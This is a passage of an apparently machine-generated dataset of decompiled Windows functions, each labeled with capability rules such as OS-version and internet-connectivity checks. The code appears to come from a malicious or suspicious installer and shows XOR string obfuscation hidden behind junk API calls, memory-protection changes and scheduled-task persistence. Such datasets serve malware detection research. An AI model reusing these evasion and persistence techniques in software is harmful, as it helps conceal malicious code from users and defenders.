        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040777c(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_28h;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_28h._0_1_ = 0;\n    var_4h = 0;\n    puVar4 = &var_28h + 1;\n    for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_8h = 0;\n    var_ch = 0;\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    *0x41db60 = fcn.0040d130();\n    iVar3 = fcn.00405c8d();\n    if (iVar3 == 0) {\n        fcn.00405ecb();\n        fcn.00402233();\n    }\n    while (iVar3 = fcn.00402f4f(),  iVar3 != 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.00409d70();\n    iVar3 = fcn.00401b0b();\n    if (iVar3 != 0) {\n        if (2 < var_28h._1_1_) {\n            iVar3 = 0;\n            if (0 < var_28h._1_1_ - 2) {\n                do {\n                    *0x41dab8 = *0x41dab8 + (&var_1ch)[iVar3];\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < var_28h._1_1_ - 2);\n            }\n        }\n        *0x41dab8 = *0x41dab8 ^ 0x43103655;\n        fcn.00405d76();\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x413300, 0x184, 0x40, &var_4h);\n    fcn.0040d29a();\n    (*pcVar1)(0x413300, 0x184, var_4h, &var_4h);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0xdc, *0x413440);\n    fcn.00401f6b(\"<%d>: EXE_SCHEDULER_INSTALL.CPP:%d > BeginExeInstallation : StaticData.Vendor : %d\", uVar2);\n    fcn.00403722();\n    fcn.00403722();\n    (*_sym.imp.KERNEL32.dll_GlobalAddAtomW)(*0x41dad0);\n    (*_sym.imp.KERNEL32.dll_AddAtomW)(*0x41dad0);\n    iVar3 = fcn.004044bb(&var_ch);\n    if (iVar3 == 0) {\n        fcn.00409d07();\n        fcn.00407234();\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    else {\n        uVar2 = (*pcVar1)(0xf3);\n        fcn.00401f6b(\"<%d>: EXE_SCHEDULER_INSTALL.CPP:%d > BeginExeInstallation : cant read original EXE, exiting\", \n                     uVar2);\n    }\n    return;\n}\n",
        "token_count": 866
    },
    "00408234": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00408234(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = param_1;\n    if (*0x41dad8 == NULL) {\n        var_2ch = 0x16322320;\n        var_28h = 0x5d7224;\n        var_24h = 0x21301617;\n        var_20h._0_2_ = 0x231a;\n        var_20h._2_1_ = 0x65;\n        var_1ch = 0x79655069;\n        var_18h._0_2_ = 0x4453;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_8h = 6;\n        iVar7 = 0;\n        var_10h = iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_CloseClipboard)();\n            if (iVar5 != 0x90f1f2) {\n                *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xf);\n        var_2ch = 0x342b1338;\n        var_28h = 0x4460070b;\n        var_24h = 0x7023e77;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x53);\n        var_1ch = 0x5a597653;\n        var_18h._0_2_ = 0x6b6e;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_ch = &var_2ch - iVar4;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            iVar5 = var_10h;\n            if (iVar6 != 0xac8272) {\n                *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n        *0x41dad8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n        if (*0x41dad8 == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_14h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_14h),  iVar4 != 0)) {\n        iVar7 = (**0x41dad8)(iVar4, &var_4h);\n        var_4h = var_4h & -(iVar7 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    }\n    return var_4h;\n}\n",
        "token_count": 1011
    },
    "004091d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004091d8(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t *puVar8;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.00408234();\n    fcn.0040895c(0, &var_4h);\n    var_8h = var_4h;\n    puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar3 != NULL) {\n        do {\n            iVar4 = fcn.0040895c(var_8h, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar4 != 0) || (var_4h <= var_8h)) break;\n            var_8h = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar3 != NULL);\n        uVar6 = 2;\n        if ((puVar3 != NULL) && (uVar1 <= var_8h)) {\n            var_8h = 0;\n            puVar8 = puVar3 + 2;\n            if (*puVar3 != 0) {\n                do {\n                    pcVar7 = *(puVar8 + 0x1e) + 0x20 + puVar8;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX),  iVar4 == 0)) {\ncode_r0x004092df:\n                        uVar6 = 0;\n                        *arg_8h = puVar8[2];\n                        arg_8h[1] = puVar8[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar8[4];\n                        }\n                        goto code_r0x00409300;\n                    }\n                    cVar2 = *pcVar7;\n                    pcVar5 = pcVar7;\n                    while (cVar2 != '.') {\n                        if (cVar2 == '\\0') goto code_r0x004092ca;\n                        pcVar5 = pcVar5 + 1;\n                        cVar2 = *pcVar5;\n                    }\n                    *pcVar5 = '\\0';\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX);\n                    if (iVar4 == 0) goto code_r0x004092df;\ncode_r0x004092ca:\n                    puVar8 = puVar8 + 0x48;\n                    var_8h = var_8h + 1;\n                } while (var_8h < *puVar3);\n                uVar6 = 2;\n            }\n            goto code_r0x00409300;\n        }\n    }\n    uVar6 = 8;\ncode_r0x00409300:\n    if (puVar3 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 813
    },
    "00409bc8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409bc8(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    uVar6 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x00409c0a;\n                pcVar3 = param_1 + pcVar2;\n            } while (*pcVar3 != '\\\\');\n            if (pcVar3 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar3 + 1));\n                param_1 = pcVar3 + 1;\n            }\n        }\ncode_r0x00409c0a:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar3 = pcVar2;\n            pcVar5 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar5 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar3 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar3 = pcVar3 + 1;\n            }\n            pcVar2[pcVar5] = '\\0';\n            cVar4 = *pcVar2;\n            pcVar3 = pcVar2;\n            while (cVar4 != '\\0') {\n                cVar4 = *pcVar3;\n                if (cVar4 + 0x9fU < 0x1a) {\n                    cVar4 = cVar4 + -0x20;\n                }\n                *pcVar3 = cVar4;\n                pcVar3 = pcVar3 + 1;\n                cVar4 = *pcVar3;\n            }\n            uVar6 = fcn.004057a4();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 641
    },
    "0040a2e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040a2e5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_EDX;\n    code *pcVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint ARG_0;\n    uint lpDst;\n    uint var_84h;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint var_74h;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t var_64h;\n    int32_t *var_60h;\n    uint32_t var_5ch;\n    int32_t *var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t *var_44h;\n    int32_t *var_40h;\n    int32_t var_3ch;\n    int32_t *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_10h;\n    int32_t pbstr;\n    uint var_8h;\n    \n    var_5ch = 0;\n    var_44h = NULL;\n    puVar6 = &lpDst;\n    var_60h = in_EDX;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    puVar6 = &ARG_0;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_38h = 0x6;\n    if (*0x41db60 == 0) {\n        var_30h = 0x6b1d396b;\n        var_2ch = 0x390b7023;\n        var_28h = 0x70346b1a;\n        var_24h._0_2_ = 0x3901;\n        var_10h = 0x5;\n        var_24h._2_1_ = 5;\n        stack0xffffffdb = 0x770316b;\n        var_20h._3_1_ = 0x39;\n        var_1ch = 0x70556b06;\n        var_18h._0_1_ = 0x4e;\n        var_18h._1_1_ = 0x39;\n        pbstr = 0x6b48394e;\n        var_8h._0_2_ = 0x7070;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x35);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetCursor)();\n            if (iVar3 != 0x5d2053) {\n                *(iVar7 + iVar4) = *(&pbstr + iVar7 % var_38h) ^ (iVar7 + iVar4)[&var_30h - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1a);\n    }\n    else {\n        var_34h = 0x302a3548;\n        var_30h = 0x69786d2c;\n        var_2ch = 0x35386360;\n        var_28h = 0x6d26303d;\n        var_24h._0_2_ = 0x6967;\n        var_24h._2_1_ = 0x7e;\n        stack0xffffffdb = 0x24352c63;\n        var_20h._3_1_ = 0x30;\n        var_1ch = 0x69106d26;\n        var_18h._0_1_ = 0x30;\n        var_18h._1_1_ = 99;\n        pbstr = 0x3069356d;\n        var_8h._0_2_ = CONCAT11(var_8h._1_1_, 99);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_10h = 0x5;\n        iVar7 = 0;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n            if (iVar3 != 0xfd9f53) {\n                *(iVar7 + iVar4) = *(&pbstr + iVar7 % var_10h) ^ (iVar7 + iVar4)[&var_34h - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1e);\n    }\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpDst, 0x104);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    var_50h = 0x3218594d;\n    var_4ch = 0x6b7c682a;\n    var_48h = 0x59687641;\n    pbstr = 0x326b5968;\n    var_8h._0_2_ = CONCAT11(var_8h._1_1_, 0x76);\n    uVar2 = (*pcVar5)(8, 0x19);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_3ch = iVar4;\n    var_38h = &var_50h - iVar4;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar3 != 0xe20da1) {\n            *(iVar7 + iVar4) = *(&pbstr + iVar7 % var_10h) ^ *((&var_50h - iVar4) + iVar7 + iVar4);\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, &lpDst, arg_10h);\n    iVar7 = (**(*var_58h + 0x44))(var_58h, &var_44h);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (-1 < iVar7) {\n        var_40h = NULL;\n        iVar7 = (**(*var_44h + 0x30))(var_44h, 0, &var_40h);\n        if (-1 < iVar7) {\n            var_10h = NULL;\n            iVar7 = (***var_40h)(var_40h, str.MbLk, &var_10h);\n            pcVar1 = _sym.imp.OLEAUT32.dll_SysReAllocString;\n            if (-1 < iVar7) {\n                pbstr = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(arg_ch);\n                if (pbstr != 0) {\n                    iVar7 = (**(*var_10h + 0x2c))(var_10h, pbstr);\n                    if (-1 < iVar7) {\n                        var_38h = NULL;\n                        var_64h = (*pcVar1)(&ARG_0);\n                        pcVar5 = _sym.imp.OLEAUT32.dll_VariantClear;\n                        var_2ch = var_2ch & 0xffff0000;\n                        (*_sym.imp.OLEAUT32.dll_VariantClear)(&var_74h);\n                        var_84h = var_74h;\n                        uStack132 = uStack116;\n                        uStack128 = uStack112;\n                        uStack124 = uStack108;\n                        (*pcVar5)(&var_54h);\n                        iVar4 = (**(*var_60h + 0x44))\n                                          (var_60h, arg_8h, var_58h, 6, var_54h, var_50h, var_4ch, var_48h, var_2ch, \n                                           var_28h, CONCAT13(var_24h._3_1_, CONCAT12(var_24h._2_1_, var_24h)), \n                                           CONCAT13(var_20h._3_1_, var_20h), 3, var_84h, uStack132, uStack128, uStack124\n                                           , &var_38h);\n                        pcVar5 = _sym.imp.OLEAUT32.dll_VariantCopy;\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_54h);\n                        (*pcVar5)(&var_74h);\n                        var_5ch = -1 < iVar4;\n                        if (var_5ch != 0) {\n                            (**(*var_38h + 8))(var_38h);\n                        }\n                        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        iVar4 = var_3ch;\n                        if (var_64h != 0) {\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_64h);\n                            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                            iVar4 = var_3ch;\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                }\n                (**(*var_10h + 8))(var_10h);\n            }\n            (**(*var_40h + 8))(var_40h);\n        }\n        (**(*var_44h + 8))(var_44h);\n    }\n    uVar2 = (*pcVar5)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return var_5ch;\n}\n",
        "token_count": 2373
    },
    "0040a953": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040a953(uint noname_0, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint *puVar4;\n    int32_t iVar5;\n    uint ARG_0;\n    uint lpDst;\n    uint var_4ch;\n    int32_t *var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_44h = 0;\n    puVar4 = &lpDst;\n    var_4ch = in_EDX;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    puVar4 = &ARG_0;\n    for (iVar3 = 0x208; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    if (*0x41db60 == 0) {\n        var_20h._0_1_ = 1;\n        var_40h = 5;\n        var_20h._2_1_ = 5;\n        var_2ch = 0x6b1d396b;\n        var_28h = 0x390b7023;\n        var_24h = 0x70346b1a;\n        var_20h._1_1_ = 0x39;\n        stack0xffffffdf = 0x770316b;\n        var_1ch._3_1_ = 0x39;\n        var_10h = 6;\n        var_18h = 0x70556b06;\n        var_14h._0_1_ = 0x4e;\n        var_14h._1_1_ = 0x39;\n        var_8h = 0x6b48394e;\n        var_4h._0_2_ = 0x7070;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x35);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar5 = 0;\n        do {\n            iVar2 = (*_sym.imp.USER32.dll_GetCursor)();\n            if (iVar2 != 0x5d2053) {\n                *(iVar5 + iVar3) = *(&var_8h + iVar5 % var_10h) ^ (iVar5 + iVar3)[&var_2ch - iVar3];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1a);\n    }\n    else {\n        var_30h = 0x302a3548;\n        var_2ch = 0x69786d2c;\n        var_28h = 0x35386360;\n        var_24h = 0x6d26303d;\n        var_20h._0_1_ = 0x67;\n        var_20h._1_1_ = 0x69;\n        var_20h._2_1_ = 0x7e;\n        stack0xffffffdf = 0x24352c63;\n        var_1ch._3_1_ = 0x30;\n        var_18h = 0x69106d26;\n        var_14h._0_1_ = 0x30;\n        var_14h._1_1_ = 99;\n        var_10h = 0x3069356d;\n        var_ch._0_1_ = 99;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_40h = 5;\n        iVar5 = 0;\n        do {\n            iVar2 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n            if (iVar2 != 0xfd9f53) {\n                *(iVar5 + iVar3) = *(&var_10h + iVar5 % var_40h) ^ (iVar5 + iVar3)[&var_30h - iVar3];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1e);\n    }\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar3, &lpDst, 0x104);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    var_3ch = 0x3218594d;\n    var_38h = 0x6b7c682a;\n    var_34h = 0x59687641;\n    var_8h = 0x326b5968;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x76);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_10h = &var_3ch - iVar3;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar2 != 0xe20da1) {\n            *(iVar5 + iVar3) = *(&var_8h + iVar5 % var_40h) ^ (iVar5 + iVar3)[&var_3ch - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0xc);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar3, &lpDst, arg_ch);\n    (**(*var_48h + 0x80))(var_48h, var_4ch);\n    iVar5 = (**(*var_48h + 0x88))(var_48h, 0x410bb0);\n    if (((-1 < iVar5) && (iVar5 = (**(*var_48h + 0x70))(var_48h, 0x2000),  -1 < iVar5)) &&\n       (iVar5 = (**(*var_48h + 0x78))(var_48h, &ARG_0, 0),  -1 < iVar5)) {\n        (**(*var_48h + 0xa8))(var_48h, 0xfffffffe);\n        iVar5 = fcn.0040a857();\n        if (-1 < iVar5) {\n            var_44h = 1;\n        }\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return var_44h;\n}\n",
        "token_count": 1688
    },
    "0040acec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040acec(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int16_t *piVar9;\n    uint lpFileName;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *ppv;\n    int32_t var_10h;\n    int32_t pszFirst;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    var_30h = 0x6336772c;\n    var_34h = 0;\n    var_20h = NULL;\n    ppv = NULL;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_10h = 0;\n    var_2ch = 0x776a711c;\n    var_28h = 0x71706376;\n    pszFirst = 0x635a7748;\n    var_8h._0_2_ = 0x7170;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = 0;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar6 != 0x2c141) {\n            var_24h = 6;\n            *(iVar7 + piVar5) = *(&pszFirst + iVar7 % 6) ^ (iVar7 + piVar5)[&var_30h - piVar5];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    iVar7 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar7) {\n        iVar7 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x4103f0, 0, 1, 0x4103e0, &ppv);\n        if ((-1 < iVar7) && (ppv != NULL)) {\n            iVar7 = (**(*ppv + 0x14))(ppv, &var_20h);\n            if ((-1 < iVar7) && (var_20h != NULL)) {\n                iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                pcVar2 = _sym.imp.ole32.dll_CoTaskMemFree;\n                while ((-1 < iVar7 && (var_10h != 0))) {\n                    do {\n                        var_10h = var_10h + -1;\n                        uVar4 = *(var_1ch + var_10h * 4);\n                        var_24h = uVar4;\n                        iVar7 = (**(*ppv + 0x18))(ppv, uVar4, 0x410400, &var_18h);\n                        if ((-1 < iVar7) && (var_18h != NULL)) {\n                            pszFirst = 0;\n                            var_4h = NULL;\n                            iVar7 = (**(*var_18h + 0x84))(var_18h, &pszFirst);\n                            if ((-1 < iVar7) && (pszFirst != 0)) {\n                                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, *0x41db48);\n                                if ((iVar7 != 0) &&\n                                   ((iVar7 = (**(*var_18h + 0x8c))(var_18h, &var_4h),  -1 < iVar7 && (var_4h != NULL))))\n                                {\n                                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(var_4h, piVar5);\n                                    piVar3 = var_4h;\n                                    if ((iVar7 != 0) &&\n                                       (((*var_4h == 0x22 && (var_4h[2] == 0x3a)) && (var_4h[3] == 0x5c)))) {\n                                        puVar8 = &lpFileName;\n                                        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                            *puVar8 = 0;\n                                            puVar8 = puVar8 + 1;\n                                        }\n                                        piVar9 = piVar5;\n                                        do {\n                                            iVar1 = *piVar9;\n                                            piVar9 = piVar9 + 1;\n                                        } while (iVar1 != var_34h);\n                                        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(piVar3, piVar5);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_4h + 1, \n                                                   ((iVar7 - var_4h >> 1) - 2) + (piVar9 - (piVar5 + 1) >> 1));\n                                        iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        uVar4 = var_24h;\n                                        if (iVar7 == -1) {\n                                            (**(*ppv + 0x1c))(ppv, var_24h);\n                                        }\n                                    }\n                                    (*pcVar2)(var_4h);\n                                }\n                                (*pcVar2)(pszFirst);\n                            }\n                            (**(*var_18h + 8))(var_18h);\n                        }\n                        (*pcVar2)(uVar4);\n                    } while (var_10h != 0);\n                    (*pcVar2)(var_1ch);\n                    iVar7 = (**(*var_20h + 0xc))(var_20h, 0xf, &var_1ch, &var_10h);\n                }\n                (**(*var_20h + 8))(var_20h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 1458
    },
    "0040b460": {
        "rules": [
